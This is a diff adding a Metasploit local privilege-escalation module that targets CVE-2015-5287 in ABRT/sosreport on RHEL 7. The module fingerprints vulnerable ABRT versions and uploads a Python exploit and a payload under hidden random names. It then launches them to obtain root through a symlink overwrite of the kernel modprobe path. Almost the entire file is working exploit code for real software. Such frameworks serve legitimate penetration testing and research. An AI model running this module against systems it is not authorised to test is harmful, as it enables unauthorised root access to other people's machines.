@@ -1,0 +1,160 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::System
+  include Msf::Post::Linux::Kernel
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'ABRT sosreport Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges on RHEL systems with
+        a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured
+        as the crash handler.
+
+        `sosreport` uses an insecure temporary directory, allowing local users
+        to write to arbitrary files (CVE-2015-5287). This module uses a symlink
+        attack on `/var/tmp/abrt/cc-*$pid/` to overwrite the `modprobe` path
+        in `/proc/sys/kernel/modprobe`, resulting in root privileges.
+
+        Waiting for `sosreport` could take a few minutes.
+
+        This module has been tested successfully on:
+
+        abrt 2.1.11-12.el7 on RHEL 7.0 x86_64; and
+        abrt 2.1.11-19.el7 on RHEL 7.1 x86_64.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'rebel', # Discovery and sosreport-rhel7.py exploit
+          'bcoles' # Metasploit
+        ],
+      'DisclosureDate' => '2015-11-23',
+      'Platform'       => ['linux'],
+      'Arch'           =>
+        [
+          ARCH_X86,
+          ARCH_X64,
+          ARCH_ARMLE,
+          ARCH_AARCH64,
+          ARCH_PPC,
+          ARCH_MIPSLE,
+          ARCH_MIPSBE
+        ],
+      'SessionTypes'   => ['shell', 'meterpreter'],
+      'Targets'        => [[ 'Auto', {} ]],
+      'References'     =>
+        [
+          ['BID', '78137'],
+          ['CVE', '2015-5287'],
+          ['EDB', '38832'],
+          ['URL', 'https://www.openwall.com/lists/oss-security/2015/12/01/1'],
+          ['URL', 'https://access.redhat.com/errata/RHSA-2015:2505'],
+          ['URL', 'https://access.redhat.com/security/cve/CVE-2015-5287'],
+          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1266837']
+        ]
+    ))
+    register_options [
+      OptInt.new('TIMEOUT', [true, 'Timeout for sosreport (seconds)', '600'])
+    ]
+    register_advanced_options [
+      OptBool.new('ForceExploit',  [false, 'Override check result', false]),
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir']
+  end
+
+  def timeout
+    datastore['TIMEOUT']
+  end
+
+  def check
+    kernel_core_pattern = cmd_exec 'grep abrt-hook-ccpp /proc/sys/kernel/core_pattern'
+    unless kernel_core_pattern.include? 'abrt-hook-ccpp'
+      vprint_error 'System is not configured to use ABRT for crash reporting'
+      return CheckCode::Safe
+    end
+    vprint_good 'System is configured to use ABRT for crash reporting'
+
+    if cmd_exec('systemctl status abrt-ccpp | grep Active').include? 'inactive'
+      vprint_error 'abrt-ccp service not running'
+      return CheckCode::Safe
+    end
+    vprint_good 'abrt-ccpp service is running'
+
+    # Patched in 2.1.11-35.el7
+    pkg_info = cmd_exec('yum list installed abrt | grep abrt').to_s
+    abrt_version = pkg_info[/^abrt.*$/].to_s.split(/\s+/)[1]
+    if abrt_version.blank?
+      vprint_status 'Could not retrieve ABRT package version'
+      return CheckCode::Safe
+    end
+    unless Gem::Version.new(abrt_version) < Gem::Version.new('2.1.11-35.el7')
+      vprint_status "ABRT package version #{abrt_version} is not vulnerable"
+      return CheckCode::Safe
+    end
+    vprint_good "ABRT package version #{abrt_version} is vulnerable"
+
+    unless command_exists? 'python'
+      vprint_error 'python is not installed'
+      return CheckCode::Safe
+    end
+    vprint_good 'python is installed'
+
+    CheckCode::Appears
+  end
+
+  def upload_and_chmodx(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    chmod path
+    register_file_for_cleanup path
+  end
+
+  def exploit
+    unless check == CheckCode::Appears
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if is_root?
+      unless datastore['ForceExploit']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
+      end
+    end
+
+    unless writable? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    exe_data = ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2015-5287', 'sosreport-rhel7.py')
+    exe_name = ".#{rand_text_alphanumeric 5..10}"
+    exe_path = "#{base_dir}/#{exe_name}"
+    upload_and_chmodx exe_path, exe_data
+
+    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    register_file_for_cleanup '/tmp/hax.sh'
+
+    print_status "Launching exploit - This might take a few minutes (Timeout: #{timeout}s) ..."
+    output = cmd_exec "echo \"#{payload_path}& exit\" | #{exe_path}", nil, timeout
+    output.each_line { |line| vprint_status line.chomp }
+  end
+end
